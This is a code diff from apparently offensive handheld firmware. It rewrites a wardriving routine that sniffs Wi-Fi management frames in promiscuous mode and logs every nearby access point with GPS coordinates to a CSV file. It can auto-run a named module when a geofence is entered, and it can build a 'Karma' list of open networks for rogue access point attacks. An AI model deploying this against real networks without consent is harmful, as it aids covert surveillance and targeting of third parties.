-  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-  M5.Lcd.setCursor(0, 10);
-  M5.Lcd.printf("Scanning...");
-  M5.Lcd.setCursor(0, 30);
-  M5.Lcd.println("No GPS Data");
-
-  delay(1000);
-  if (!SD.exists("/evil/wardriving")) {
-    SD.mkdir("/evil/wardriving");
-  }
-
-  File root = SD.open("/evil/wardriving");
-  int maxIndex = 0;
-  while (true) {
-    File entry = root.openNextFile();
-    if (!entry) break;
-    String name = entry.name();
-    int startIndex = name.indexOf('-') + 1;
-    int endIndex = name.indexOf('.');
-    if (startIndex > 0 && endIndex > startIndex) {
-      int fileIndex = name.substring(startIndex, endIndex).toInt();
-      if (fileIndex > maxIndex) maxIndex = fileIndex;
-    }
-    entry.close();
-  }
+  if (!SD.exists("/evil/wardriving")) SD.mkdir("/evil/wardriving");
+  File root = SD.open("/evil/wardriving"); int maxIndex = 0;
+  while (true) { File e = root.openNextFile(); if (!e) break; String nm = e.name();
+    int s = nm.indexOf('-') + 1, en = nm.indexOf('.'); if (s > 0 && en > s) { int fi = nm.substring(s, en).toInt(); if (fi > maxIndex) maxIndex = fi; } e.close(); }
   root.close();
+  String fileName = "/evil/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv";
+  File out = SD.open(fileName, FILE_WRITE);
+  if (out) { out.println(createPreHeader()); out.println(createHeader()); }
 
-  bool exitWardriving = false;
-  bool scanStarted = false;
-  while (!exitWardriving) {
-    M5.update(); cardUpdate();
-    handleDnsRequestSerial();
+  // Un seul sprite (double-buffer). La carte P6 dessine ses tuiles DIRECTEMENT dans cv (pas de 2e
+  // sprite -> economie RAM) et le rendu P6 est throttle (les tuiles ne sont relues que ~2.5x/s).
+  auto& D = M5.Display; const int W = D.width(), H = D.height(); const int MAPH = H - 25;
+  M5Canvas cv(&D); cv.setColorDepth(8); bool spr = cv.createSprite(W, H);
 
-    if (!scanStarted) {
-      WiFi.scanNetworks(true, true); // Start async scan
-      scanStarted = true;
+  GeoCtx geo = geoLoad();
+  WdAp* aps = (WdAp*)malloc(sizeof(WdAp) * WD_MAX);
+  wdQ = (WdCap*)malloc(sizeof(WdCap) * WD_CAPQ);
+  // Dedup : tableaux FIXES tries (dkey=MAC, dval=index aps[] ou 0xFFFF), ~10 o/AP. PAS de std::vector
+  // -> PAS de realloc -> PAS de std::bad_alloc sous fragmentation (qui crashait a ~512 AP, exception
+  // non capturee -> abort). Memoire totalement previsible, capacite = WD_DEDUP_MAX.
+  uint64_t* dkey = (uint64_t*)malloc(sizeof(uint64_t) * WD_EXACT_MAX);   // dedup exacte : seulement les AP qui ont un slot d'affichage (liste/carte/RSSI)
+  uint16_t* dval = (uint16_t*)malloc(sizeof(uint16_t) * WD_EXACT_MAX);
+  uint8_t*  bloom = (uint8_t*)calloc(WD_BLOOM_BITS / 8, 1);              // dedup APPROX globale (8 Ko) -> uniq/CSV au-dela de 1200 sans flood ni OOM
+  int dn = 0;
+  if (!aps || !wdQ || !dkey || !dval || !bloom) { if (aps) free(aps); if (wdQ) { free(wdQ); wdQ = nullptr; } if (dkey) free(dkey); if (dval) free(dval); if (bloom) free(bloom); if (out) out.close(); geoFree(geo); waitAndReturnToMenu("Out of memory"); return; }
+  int wdN = 0; uint32_t uniq = 0, total = 0, apDrop = 0;   // apDrop = AP uniques ignores (cap atteint) -> indicateur drop
+  g_wdRunning = true; g_wdUniq = g_wdTotal = g_wdApDrop = 0; g_wdN = g_wdDn = 0;   // etat live pour "wdstat"
+  uint16_t chanCount[15]; memset(chanCount, 0, sizeof chanCount);
+  uint32_t authCount[7];  memset(authCount, 0, sizeof authCount);
+  wdHead = wdTail = 0; wdSeen = 0; wdDrop = 0;
+
+  WiFi.mode(WIFI_STA); WiFi.disconnect();
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); esp_wifi_init(&cfg); esp_wifi_start();
+  esp_wifi_set_mode(WIFI_MODE_STA);
+  wifi_country_t ctry; memset(&ctry, 0, sizeof ctry); ctry.cc[0]='F'; ctry.cc[1]='R'; ctry.cc[2]=0; ctry.schan=1; ctry.nchan=13; ctry.policy=WIFI_COUNTRY_POLICY_MANUAL; esp_wifi_set_country(&ctry);
+  esp_wifi_set_promiscuous(true);
+  wifi_promiscuous_filter_t filt; filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT; esp_wifi_set_promiscuous_filter(&filt);
+  esp_wifi_set_promiscuous_rx_cb(wdSnifferCb);
+
+  int mapZ = 16, mapTiles = 0; uint32_t lastMapDraw = 0; bool mapForce = true;
+  const uint16_t BG=menuBackgroundColor, NAVY=menuSelectedBackgroundColor, GRN=menuTextFocusedColor,
+                 WHT=menuTextUnFocusedColor, RED=TFT_RED, ORG=TFT_ORANGE, CYN=TFT_CYAN, GRY=TFT_DARKGREY,
+                 YEL=TFT_YELLOW, BLU=TFT_CYAN, MAG=TFT_MAGENTA;
+  const uint16_t AUTHCOL[7] = { GRY, RED, ORG, GRN, CYN, MAG, TFT_WHITE };
+
+  bool active = false; int ch = 1, chi = 0; uint32_t chT = millis();
+  const uint32_t DWELL_MIN = 140, DWELL_MAX = 260; int newApThisDwell = 0;   // dwell >= 1 beacon (102ms) + marge -> on capte le beacon a coup sur (sinon on rate une visite sur deux)
+  uint32_t t0 = millis(), lastRate = millis(), ratePrev = 0, perMin = 0, flushT = millis();
+  int page = 0; const int NPAGES = 6; int apScroll = 0;
+  int sortMode = 0; bool openOnly = false; bool sortDirty = true; uint32_t lastSort = 0;
+  std::vector<uint16_t> ord;
+  std::vector<std::pair<float,float>> trk;                 // track GPS (onglet carte, perf-safe, pas de tuiles SD)
+  double ltLat = 0, ltLon = 0; bool ltSet = false;
+  double lastLat = 0, lastLon = 0; bool haveLast = false; float trkDist = 0;
+  char lastSsid[34] = "?"; int lastRssi = 0; uint8_t lastAuth = 0, lastCh = 0;
+  bool quit = false; enterDebounce();
+
+  auto rssiCol = [&](int r) -> uint16_t { return r >= -60 ? GRN : (r >= -72 ? YEL : (r >= -82 ? ORG : RED)); };
+
+  while (!quit) {
+    esp_task_wdt_reset(); M5.update(); cardUpdate();
+    uint32_t now = millis();
+    while (cardgps.available()) gps.encode(cardgps.read());          // GPS non bloquant
+    bool fix = gps.location.isValid();
+    if (fix) { lat = gps.location.lat(); lng = gps.location.lng(); alt = gps.altitude.meters();
+               float hd = gps.hdop.isValid() ? gps.hdop.hdop() : 0; accuracy = hd > 0 ? hd * 5.0f : 0;
+               if (haveLast) { double d = geoDistM((float)lastLat,(float)lastLon,(float)lat,(float)lng); if (d >= 3.0 && d < 1000) trkDist += d; }
+               lastLat = lat; lastLon = lng; haveLast = true;
+               if (!ltSet || geoDistM((float)ltLat,(float)ltLon,(float)lat,(float)lng) >= 8.0) {   // point de track tous les ~8m
+                 if (trk.size() >= 250) trk.erase(trk.begin());
+                 trk.push_back(std::make_pair((float)lat, (float)lng)); ltLat = lat; ltLon = lng; ltSet = true;
+               } }
+    uint32_t dwellMs = newApThisDwell ? DWELL_MAX : DWELL_MIN;   // canal actif -> on reste plus (240ms), calme -> hop rapide (110ms)
+    if (now - chT > dwellMs) { chi = (chi + 1) % WD_CHSEQ_N; ch = WD_CHSEQ[chi]; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); chT = now; newApThisDwell = 0; if (active) wdTxProbe(nullptr); }
+
+    int drained = 0;
+    while (wdTail != wdHead && drained < 48) {
+      WdCap c = wdQ[wdTail]; wdTail = (wdTail + 1) % WD_CAPQ; drained++; total++;
+      uint64_t id = 0; for (int i = 0; i < 6; i++) id = (id << 8) | c.bssid[i];
+      strncpy(lastSsid, c.ssid[0] ? c.ssid : "(hidden)", sizeof lastSsid); lastSsid[sizeof lastSsid - 1] = 0;
+      lastRssi = c.rssi; lastAuth = c.auth < 7 ? c.auth : 0; lastCh = c.ch;
+      // 1) dedup EXACTE (uniquement les AP qui ont un slot d'affichage, <= WD_MAX) -> maj best-RSSI/last.
+      size_t lo = (size_t)(std::lower_bound(dkey, dkey + dn, id) - dkey);
+      if (lo < (size_t)dn && dkey[lo] == id) {               // AP connu AVEC slot -> maj et on passe au suivant
+        uint16_t slot = dval[lo];
+        if (slot != 0xFFFF) { WdAp& a = aps[slot]; if (c.rssi > a.rssi) { a.rssi = c.rssi; if (fix) { a.lat = lat; a.lon = lng; } } a.last = now; }
+        continue;
+      }
+      // 2) sinon : filtre de Bloom (dedup globale, SANS limite 1200). Deja vu -> rien (anti-flood : c'est
+      //    ce re-traitement par trame qui saturait la SD -> carte noire + crash). Nouveau -> on compte+logue 1x.
+      if (wdBloomSeenThenAdd(bloom, id)) continue;
+      uniq++; newApThisDwell++;                              // === NOUVEL AP UNIQUE (borne = capacite Bloom ~7000, plus 1200) ===
+      if (c.ch >= 1 && c.ch <= 14) chanCount[c.ch]++; if (c.auth < 7) authCount[c.auth]++;
+      if (wdN < WD_MAX && dn < WD_EXACT_MAX) {               // slot d'affichage libre -> enregistrement complet (liste + carte + RSSI)
+        WdAp& a = aps[wdN]; memcpy(a.bssid, c.bssid, 6); strncpy(a.ssid, c.ssid, sizeof a.ssid - 1); a.ssid[sizeof a.ssid - 1] = 0;
+        a.ch = c.ch; a.rssi = c.rssi; a.auth = c.auth < 7 ? c.auth : 0; a.first = a.last = now; a.lat = fix ? lat : 0; a.lon = fix ? lng : 0;
+        memmove(&dkey[lo + 1], &dkey[lo], (dn - lo) * sizeof(uint64_t));   // insertion triee dans le tableau FIXE (pas de realloc)
+        memmove(&dval[lo + 1], &dval[lo], (dn - lo) * sizeof(uint16_t));
+        dkey[lo] = id; dval[lo] = (uint16_t)wdN; dn++; wdN++;
+      }                                                      // au-dela de 200 : compte + logue CSV mais pas d'entree liste (pas une perte)
+      if (fix && out) {                                      // ecriture CSV illimitee (tant qu'il y a un fix GPS)
+        if (ESP.getFreeHeap() > WD_HEAP_FLOOR) {
+          char mac[18]; snprintf(mac, sizeof mac, "%02X:%02X:%02X:%02X:%02X:%02X", c.bssid[0],c.bssid[1],c.bssid[2],c.bssid[3],c.bssid[4],c.bssid[5]);
+          out.println(String(mac) + "," + String(c.ssid) + "," + wdAuthWigle(c.auth) + "," + formatTimeFromGPS() + "," + String(c.ch) + "," + String(c.rssi) + "," + String(lat, 6) + "," + String(lng, 6) + "," + String(alt, 1) + "," + String(accuracy, 1) + ",WIFI");
+          if (geo.count > 0) { char zn[24], za[28]; int ev = geoCheck(geo, (float)lat, (float)lng, zn, sizeof zn, za, sizeof za);
+            if (ev != 0) { geoLogEvent(zn, ev, (float)lat, (float)lng, formatTimeFromGPS().c_str()); if (ev > 0 && za[0]) runByName(za); } }
+        } else apDrop++;                                     // heap critique : ecriture sautee (tres rare, device sans PSRAM) -> indicateur drop
+      }
     }
+    if (out && now - flushT > 3000) { out.flush(); flushT = now; }
+    if (now - lastRate >= 1000) { perMin = (uniq - ratePrev) * 60; ratePrev = uniq; lastRate = now; }
+    g_wdUniq = uniq; g_wdTotal = total; g_wdApDrop = apDrop; g_wdN = wdN; g_wdDn = dn;   // expose a "wdstat"
 
-    bool gpsDataAvailable = false;
-    String gpsData;
+    // ---- navigation ----
+    if (kp(KEY_ENTER) || kp(KEY_BACKSPACE) || kp('`')) { quit = true; break; }
+    if (kp('m')) { active = !active; delay(160); }
+    if (kp(',')) { page = (page + NPAGES - 1) % NPAGES; apScroll = 0; delay(150); }   // page precedente
+    if (kp('/')) { page = (page + 1) % NPAGES; apScroll = 0; delay(150); }            // page suivante
+    if (kp('1')) page = 0; if (kp('2')) page = 1; if (kp('3')) page = 2; if (kp('4')) page = 3; if (kp('5')) page = 4; if (kp('6')) page = 5;
+    if (page == 5) {                                     // zoom carte satellite (P6)
+      if (kp('=') || kp('+')) { if (mapZ < 17) { mapZ++; mapForce = true; } delay(150); }
+      if (kp('-') || kp('_')) { if (mapZ > 13) { mapZ--; mapForce = true; } delay(150); }
+    }
+    if (kp('s')) { sortMode = (sortMode + 1) % 4; sortDirty = true; apScroll = 0; delay(160); }   // cycle tri (liste AP)
+    if (kp('o')) { openOnly = !openOnly; sortDirty = true; apScroll = 0; delay(160); }             // filtre open-only
+    if (kp(';')) { if (apScroll > 0) apScroll--; delay(90); }                         // scroll haut
+    if (kp('.')) { apScroll++; delay(90); }                                           // scroll bas
 
-    while (cardgps.available() > 0 && !gpsDataAvailable) {
-      if (gps.encode(cardgps.read())) {
-        if (gps.location.isValid() && gps.date.isValid() && gps.time.isValid()) {
-          lat = gps.location.lat();
-          lng = gps.location.lng();
-          alt = gps.altitude.meters();
-          accuracy = gps.hdop.value();
-          gpsDataAvailable = true;
-          // Affichage des informations GPS sur l'écran
-          M5.Lcd.setCursor(0, 30);
-          M5.Lcd.print("Longitude:");
-          M5.Lcd.println(String(gps.location.lng(), 6));
-          M5.Lcd.setCursor(0, 45);
-          M5.Lcd.print("Latitude:");
-          M5.Lcd.println(String(gps.location.lat(), 6));
-          M5.Lcd.setCursor(0, 60);
-          M5.Lcd.print("Sattelites:" + String(gps.satellites.value()));
-          M5.Lcd.println("  ");
+    // ---- rendu multi-pages ----
+    // ---- rendu M5GFX multi-pages ----  La P6 (carte, lecture tuiles SD) est throttle a ~2.5 fps ;
+    // le drain (capture) ci-dessus tourne a CHAQUE loop -> capture jamais degradee par le rendu carte.
+    if (page == 5 && !mapForce && (now - lastMapDraw < 400)) { delay(8); continue; }
+    if (page == 5) { lastMapDraw = now; mapForce = false; }
+    lgfx::LovyanGFX* g = spr ? (lgfx::LovyanGFX*)&cv : (lgfx::LovyanGFX*)&D;
+    const uint16_t CARD = 0x1906, STRIPE = 0x10A2, PILLP = 0x2966, DIM = 0x4208;
+    auto sigBars = [&](int x, int y, int rssi) {         // 4 barres facon signal
+      int lvl = rssi >= -55 ? 4 : rssi >= -67 ? 3 : rssi >= -78 ? 2 : rssi >= -88 ? 1 : 0;
+      uint16_t col = rssiCol(rssi);
+      for (int b = 0; b < 4; b++) { int bh = 2 + b * 2; g->fillRect(x + b * 4, y + 8 - bh, 3, bh, b < lvl ? col : DIM); }
+    };
+    g->fillScreen(BG);
+    // ---- HEADER : titre + page-dots + pill canal/mode ----
+    g->fillRect(0, 0, W, 14, NAVY);
+    g->setTextSize(1); g->setTextColor(GRN); g->setCursor(4, 4); g->print("WARDRIVE");
+    for (int dd = 0; dd < NPAGES; dd++) g->fillCircle(72 + dd * 9, 7, dd == page ? 3 : 1, dd == page ? GRN : GRY);
+    { char cm[16]; snprintf(cm, sizeof cm, "CH%d %s", ch, active ? "ACT" : "PASS");
+      int pw = (int)strlen(cm) * 6 + 8; uint16_t pc = active ? ORG : PILLP;
+      g->fillRoundRect(W - pw - 2, 2, pw, 11, 3, pc); g->setTextColor(active ? (uint16_t)TFT_BLACK : WHT, pc); g->setCursor(W - pw + 2, 4); g->print(cm); }
 
-          // Altitude
-          M5.Lcd.setCursor(0, 75);
-          M5.Lcd.print("Altitude:");
-          M5.Lcd.print(String(gps.altitude.meters(), 2) + "m");
-          M5.Lcd.println("  ");
-
-          // Date et Heure
-          String dateTime = formatTimeFromGPS();
-          M5.Lcd.setCursor(0, 90);
-          M5.Lcd.print("Time:");
-          M5.Lcd.print(dateTime);
-          M5.Lcd.println("  ");
+    if (page == 0) {                                     // ==== P1 : RADAR / STATS ====
+      g->fillRoundRect(3, 17, 74, 33, 4, CARD);
+      g->setTextSize(2); g->setTextColor(GRN); g->setCursor(8, 21); g->printf("%lu", (unsigned long)uniq);
+      g->setTextSize(1); g->setTextColor(GRY); g->setCursor(8, 40); g->print("UNIQUE AP");
+      g->setTextColor(CYN); g->setCursor(84, 18); g->printf("+%lu/min", (unsigned long)perMin);
+      g->setTextColor(WHT); g->setCursor(84, 30); g->printf("seen %lu", (unsigned long)total);
+      g->setTextColor((wdDrop || apDrop) ? ORG : GRY); g->setCursor(84, 42); g->printf("drop %lu/%lu", (unsigned long)wdDrop, (unsigned long)apDrop);   // queue / cap-heap (apDrop>0 = plafond AP atteint)
+      g->fillCircle(8, 58, 3, fix ? GRN : RED);
+      g->setTextColor(fix ? WHT : GRY); g->setCursor(16, 54); g->printf("s%d h%.1f %.0fkm/h %.4f,%.4f", (int)gps.satellites.value(), gps.hdop.isValid() ? gps.hdop.hdop() : 0, gps.speed.isValid() ? gps.speed.kmph() : 0, fix ? lat : 0.0, fix ? lng : 0.0);
+      int bx = 4, by = 68, bw = W - 8, bh = 9; long tt = 0; for (int i = 0; i < 7; i++) tt += authCount[i]; if (tt < 1) tt = 1;
+      int cx = bx; for (int i = 0; i < 7; i++) { int sw = (int)((long)authCount[i] * bw / tt); if (authCount[i] && sw < 2) sw = 2; g->fillRect(cx, by, sw, bh, AUTHCOL[i]); cx += sw; }
+      g->drawRoundRect(bx, by, bw, bh, 2, GRY);
+      int lx = 4, ly = 81; for (int i = 0; i < 7; i++) { if (!authCount[i]) continue; g->setTextColor(AUTHCOL[i]); g->setCursor(lx, ly); g->printf("%s:%lu", WD_AUTH_SHORT[i], (unsigned long)authCount[i]); lx += 40; if (lx > W - 34) { lx = 4; ly += 11; } }
+      sigBars(4, 103, lastRssi);
+      g->setTextColor(rssiCol(lastRssi)); g->setCursor(26, 104); g->printf("%.22s %ddBm c%d", lastSsid, lastRssi, lastCh);
+    } else if (page == 1) {                              // ==== P2 : LISTE AP (tri + filtre) ====
+      // (re)construit l'ordre d'affichage : filtre open-only + tri. Rebuild sur changement ou /1.2s (live).
+      if (sortDirty || now - lastSort > 1200) {
+        ord.clear();
+        for (int i = 0; i < wdN; i++) { if (openOnly && !(aps[i].auth == 0 || aps[i].auth == 6)) continue; ord.push_back((uint16_t)i); }
+        std::sort(ord.begin(), ord.end(), [&](uint16_t a, uint16_t b) {
+          const WdAp& A = aps[a]; const WdAp& B = aps[b];
+          switch (sortMode) {
+            case 1: return A.rssi > B.rssi;                                   // RSSI (fort -> faible)
+            case 2: return A.ch != B.ch ? A.ch < B.ch : A.rssi > B.rssi;      // canal puis RSSI
+            case 3: return strncmp(A.ssid, B.ssid, 33) < 0;                   // SSID alpha
+            default: return A.last > B.last;                                  // recent
+          }
+        });
+        sortDirty = false; lastSort = now;
+      }
+      int shown = (int)ord.size();
+      g->setTextColor(GRY); g->setCursor(4, 16); g->printf("%d AP", shown);
+      g->setTextColor(CYN); g->setCursor(64, 16); g->printf("tri:%s", WD_SORT_NAME[sortMode]);
+      if (openOnly) { g->setTextColor(GRN); g->setCursor(150, 16); g->print("[open]"); }
+      int top = 26, lh = 11, rows = (H - top - 12) / lh; if (apScroll > shown - rows) apScroll = shown - rows > 0 ? shown - rows : 0; if (apScroll < 0) apScroll = 0;
+      for (int r = 0; r < rows && apScroll + r < shown; r++) {
+        WdAp& a = aps[ord[apScroll + r]]; int ry = top + r * lh;
+        if (r & 1) g->fillRect(0, ry - 1, W, lh, STRIPE);
+        sigBars(3, ry, a.rssi);
+        g->setTextColor(rssiCol(a.rssi)); g->setCursor(24, ry); g->printf("%4d", a.rssi);
+        g->setTextColor(CYN); g->setCursor(52, ry); g->printf("c%-2d", a.ch);
+        g->setTextColor(AUTHCOL[a.auth]); g->setCursor(76, ry); g->print(WD_AUTH_SHORT[a.auth]);
+        g->setTextColor(WHT); g->setCursor(104, ry); g->printf("%.22s", a.ssid[0] ? a.ssid : "(hidden)");
+      }
+      if (shown == 0) { g->setTextColor(GRY); g->setCursor(4, 44); g->print(openOnly ? "no open AP yet..." : "no AP yet..."); }
+    } else if (page == 2) {                              // ==== P3 : CANAUX (histogramme arrondi) ====
+      uint16_t mx = 1; for (int i = 1; i <= 13; i++) if (chanCount[i] > mx) mx = chanCount[i];
+      int y = 17; for (int c2 = 1; c2 <= 13; c2++) {
+        uint16_t cnt = chanCount[c2]; uint16_t col = (c2 == ch) ? YEL : GRN;
+        g->setTextColor(c2 == ch ? YEL : WHT); g->setCursor(2, y); g->printf("%2d", c2);
+        if (cnt) { int w = (int)((long)cnt * (W - 58) / mx); if (w < 4) w = 4; g->fillRoundRect(24, y, w, 7, 2, col); }
+        else g->fillRect(24, y + 3, 2, 1, DIM);
+        g->setTextColor(GRY); g->setCursor(W - 26, y); g->printf("%d", cnt);
+        y += 8;
+      }
+    } else if (page == 3) {                              // ==== P4 : GPS ====
+      g->fillCircle(9, 22, 4, fix ? GRN : RED);
+      g->setTextColor(fix ? GRN : RED); g->setCursor(18, 18); g->printf("%s   %d sats", fix ? "GPS FIX" : "NO FIX", (int)gps.satellites.value());
+      g->setTextColor(WHT); g->setCursor(4, 36); g->printf("lat  %.6f", fix ? lat : 0.0);
+      g->setCursor(4, 48); g->printf("lon  %.6f", fix ? lng : 0.0);
+      g->setCursor(4, 62); g->printf("alt %.0fm    HDOP %.1f", gps.altitude.isValid() ? gps.altitude.meters() : 0, gps.hdop.isValid() ? gps.hdop.hdop() : 0);
+      g->setCursor(4, 74); g->printf("spd %.1fkm/h  crs %.0f", gps.speed.isValid() ? gps.speed.kmph() : 0, gps.course.isValid() ? gps.course.deg() : 0);
+      g->setTextColor(CYN); g->setCursor(4, 90); g->printf("distance %.2f km", trkDist / 1000.0);
+      if (geo.count > 0) { g->setTextColor(YEL); g->setCursor(4, 102); g->printf("geofences %d", geo.count); }
+    } else if (page == 4) {                              // ==== P5 : SESSION ====
+      uint32_t dur = (now - t0) / 1000; int bestR = -127, bestI = -1;
+      for (int i = 0; i < wdN; i++) if (aps[i].rssi > bestR) { bestR = aps[i].rssi; bestI = i; }
+      g->setTextColor(WHT); g->setCursor(4, 18); g->printf("duree  %lu:%02lu", (unsigned long)(dur / 60), (unsigned long)(dur % 60));
+      g->setCursor(4, 30); g->printf("uniq %lu   frames %lu", (unsigned long)uniq, (unsigned long)total);
+      g->setTextColor(GRN); g->setCursor(4, 44); g->printf("ouverts  %lu", (unsigned long)(authCount[0] + authCount[6]));
+      g->setTextColor(WHT); g->setCursor(4, 56); g->printf("OPN%lu WEP%lu WPA%lu W2%lu W3%lu", (unsigned long)authCount[0], (unsigned long)authCount[1], (unsigned long)authCount[2], (unsigned long)authCount[3], (unsigned long)authCount[5]);
+      if (bestI >= 0) { g->setTextColor(rssiCol(bestR)); g->setCursor(4, 70); g->printf("best %ddBm %.18s", bestR, aps[bestI].ssid[0] ? aps[bestI].ssid : "(hidden)"); }
+      g->setTextColor(CYN); g->setCursor(4, 84); g->printf("~%.2f AP/min", dur ? (uniq * 60.0 / dur) : 0.0);
+      g->setTextColor(GRY); g->setCursor(4, 98); g->printf("%.28s", fileName.c_str() + 16);
+    } else {                                             // ==== P6 : CARTE SATELLITE + SUIVI (tuiles directes dans cv, clip, throttle) ====
+      double mLat = fix ? lat : (ltSet ? ltLat : 0.0), mLon = fix ? lng : (ltSet ? ltLon : 0.0);
+      bool haveCtr = fix || ltSet;
+      g->fillRect(0, 14, W, MAPH, TFT_BLACK);            // fond carte
+      mapTiles = 0;
+      if (haveCtr) {
+        g->setClipRect(0, 14, W, MAPH);                  // confine tuiles + overlay a la zone carte (pas d'ecrasement header/footer)
+        double xf, yf; mapview::deg2tilef(mLat, mLon, mapZ, xf, yf);
+        int tx0 = (int)floor(xf), ty0 = (int)floor(yf); int ccy = 14 + MAPH / 2; int nt = 0;
+        for (int tx = tx0 - 1; tx <= tx0 + 1; tx++) for (int ty = ty0 - 1; ty <= ty0 + 1; ty++) {
+          int sx = (int)lround(W / 2.0 - (xf - tx) * 256), sy = (int)lround(ccy - (yf - ty) * 256);
+          if (sx <= -256 || sx >= W || sy <= -256 || sy >= H) continue;
+          char pth[64]; snprintf(pth, sizeof pth, "%s/%d/%d/%d.jpg", mapview::tileBase(), mapZ, tx, ty);
+          if (SD.exists(pth)) { g->drawJpgFile(SD, pth, sx, sy); nt++; }
+          else { snprintf(pth, sizeof pth, "%s/%d/%d/%d.png", mapview::tileBase(), mapZ, tx, ty); if (SD.exists(pth)) { g->drawPngFile(SD, pth, sx, sy); nt++; } }
         }
-      }
+        mapTiles = nt;
+        auto proj = [&](float la, float lo, int& x, int& y) { double x2, y2; mapview::deg2tilef(la, lo, mapZ, x2, y2); x = (int)lround(W / 2.0 + (x2 - xf) * 256); y = (int)lround(ccy + (y2 - yf) * 256); };
+        int px = -9999, py = 0;
+        for (auto& pt : trk) { int x, y; proj(pt.first, pt.second, x, y); if (px > -9999) g->drawLine(px, py, x, y, GRN); px = x; py = y; }
+        for (int i = 0; i < wdN; i++) if (aps[i].lat != 0 || aps[i].lon != 0) { int x, y; proj(aps[i].lat, aps[i].lon, x, y); g->fillCircle(x, y, 2, rssiCol(aps[i].rssi)); }
+        if (fix) { int x, y; proj((float)lat, (float)lng, x, y); g->fillCircle(x, y, 3, CYN); g->drawCircle(x, y, 5, WHT); }
+        g->clearClipRect();
+      } else { g->setTextColor(GRY); g->setCursor(4, 60); g->print("attente fix GPS..."); }
+      g->fillRect(0, 15, 168, 10, NAVY);                 // bandeau info lisible par-dessus la carte
+      g->setTextColor(mapTiles > 0 ? GRN : ORG); g->setCursor(4, 16); g->printf("%s z%d t%d  %dAP %.2fkm", (mapTiles > 0 ? "SAT" : "TRK"), mapZ, mapTiles, wdN, trkDist / 1000.0);
+      g->setTextColor(DIM); g->setCursor(W - 50, 16); g->print("=/- zoom");
     }
 
-
-    int n = WiFi.scanComplete();
-    if (n > -1) {
-      String currentTime = formatTimeFromGPS();
-      String wifiData = "\n";
-      for (int i = 0; i < n; ++i) {
-        // Formater les données pour chaque SSID trouvé
-        String line = WiFi.BSSIDstr(i) + "," + WiFi.SSID(i) + "," + getCapabilities(WiFi.encryptionType(i)) + ",";
-        line += currentTime + ",";
-        line += String(WiFi.channel(i)) + ",";
-        line += String(WiFi.RSSI(i)) + ",";
-        line += String(lat, 6) + "," + String(lng, 6) + ",";
-        line += String(alt) + "," + String(accuracy) + ",";
-        line += "WIFI";
-        wifiData += line + "\n";
-      }
-      
-      Serial.println(F("----------------------------------------------------"));
-      Serial.print("WiFi Networks: " + String(n));
-      Serial.print(wifiData);
-      Serial.println(F("----------------------------------------------------"));
-
-      String fileName = "/evil/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv";
-
-      // Ouvrir le fichier en mode lecture pour vérifier s'il existe et sa taille
-      File file = SD.open(fileName, FILE_READ);
-      bool isNewFile = !file || file.size() == 0;
-      if (file) {
-        file.close();
-      }
-
-      // Ouvrir le fichier en mode écriture ou append
-      file = SD.open(fileName, isNewFile ? FILE_WRITE : FILE_APPEND);
-
-      if (file) {
-        if (isNewFile) {
-          // Écrire les en-têtes pour un nouveau fichier
-          file.println(createPreHeader());
-          file.println(createHeader());
-        }
-        file.print(wifiData);
-        file.close();
-      }
-
-      scanStarted = false; // Reset for the next scan
-      // Mettre à jour le nombre de WiFi à proximité sur l'écran
-      M5.Lcd.setCursor(0, 10);
-      M5.Lcd.printf("Near WiFi: %d  \n", n);
-    }
-
-    if (kp(KEY_ENTER) || kp(KEY_BACKSPACE) ) {
-      exitWardriving = true;
-      delay(1000);
-      M5.Display.setTextSize(1.5);
-      if (confirmPopup("List Open Networks?")) {
-        M5.Lcd.fillScreen(menuBackgroundColor);
-        M5.Display.setCursor(5, M5.Display.height() / 2);
-        M5.Display.println("Saving Open Networks");
-        M5.Display.println("  Please wait...");
-        createKarmaList(maxIndex);
-      }
-      waitAndReturnToMenu("Stopping Wardriving.");
-      Serial.println(F("-------------------"));
-      Serial.println(F("Stopping Wardriving"));
-      Serial.println(F("-------------------"));
-    }
+    g->fillRect(0, H - 11, W, 11, NAVY);
+    g->setTextColor(GRY); g->setCursor(3, H - 9);
+    g->print(page == 1 ? ",/ page  s tri  o filtre  ;. scroll" : ",/ page   ;. scroll   m mode   DEL stop");
+    if (spr) cv.pushSprite(0, 0);
+    delay(5);
   }
 
-  Serial.println(F("-------------------"));
-  Serial.println(F("Session Saved."));
-  Serial.println(F("-------------------"));
+  esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous_rx_cb(NULL);
+  if (out) out.close();
+  if (spr) cv.deleteSprite();
+  WdCap* tmp = wdQ; wdQ = nullptr; free(tmp); free(aps); free(dkey); free(dval); free(bloom);
+  geoFree(geo);
+  M5.Display.setTextSize(1.5);
+  if (confirmPopup("List Open Networks?")) { M5.Lcd.fillScreen(menuBackgroundColor); M5.Display.setCursor(5, H / 2); M5.Display.println("Saving Open Networks"); M5.Display.println("  Please wait..."); createKarmaList(maxIndex); }
+  // Pas de popup "Upload to Wigle.net?" ici : le wardriving coupe le WiFi (promiscuous sans association),
+  // donc en sortie on n'est PAS connecte et un upload a la volee echouerait. Le CSV reste sauve sur SD ;
+  // on l'envoie via le menu Wigle (qui reconnecte proprement) ou la commande serie `wigle_up`.
+  // Nettoyage radio : le wardriving a initialise le WiFi en RAW (esp_wifi_init/start + promiscuous).
+  // Sans arret propre, le driver reste dans un etat qui fait planter l'init BLE du module suivant
+  // (ex: BitChat -> assert BTU_TASK list.c:262 list!=NULL, coexistence WiFi/BT). On arrete+deinit
+  // proprement pour liberer la radio. (L'upload Wigle eventuel ci-dessus a deja eu lieu.)
+  esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous_rx_cb(NULL);
+  WiFi.disconnect(true, false); WiFi.mode(WIFI_OFF);
+  esp_wifi_stop(); esp_wifi_deinit();
+  delay(150);
+  g_wdRunning = false;
+  waitAndReturnToMenu("Stopping Wardriving.");
 }
 
 
@@ -11306,7 +11651,22 @@ String getCapabilities(wifi_auth_mode_t encryptionType) {
     case WIFI_AUTH_WPA_PSK: return "[WPA-PSK][ESS]";
     case WIFI_AUTH_WPA2_PSK: return "[WPA2-PSK][ESS]";
     case WIFI_AUTH_WPA_WPA2_PSK: return "[WPA-WPA2-PSK][ESS]";
-    case WIFI_AUTH_WPA2_ENTERPRISE: return "[WPA2-ENTERPRISE][ESS]";
